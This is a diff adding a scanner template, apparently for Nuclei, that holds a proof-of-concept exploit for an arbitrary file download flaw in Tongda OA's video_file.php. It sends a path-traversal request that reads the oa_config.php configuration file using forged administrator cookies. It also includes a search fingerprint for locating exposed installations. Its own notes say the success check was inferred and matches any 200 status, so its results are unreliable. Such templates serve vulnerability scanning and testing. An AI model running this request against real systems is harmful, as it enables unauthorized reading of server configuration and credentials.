@@ -1,0 +1,35 @@
+id: poc-e6f69e932c20e0dd4ec1
+info:
+  name: 通达OAvideo_file.php任意文件下载漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/e6f69e932c20e0dd4ec14b1f8f77ad9c
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: e6f69e932c20e0dd4ec14b1f8f77ad9c
+    fofa: + hunter`app.name="通达 OA"`
+http:
+- raw:
+  - 'GET /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=6ad99af9; PHPSESSID=1; KEY_RANDOMDATA=13202
+
+    Upgrade-Insecure-Requests: 1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
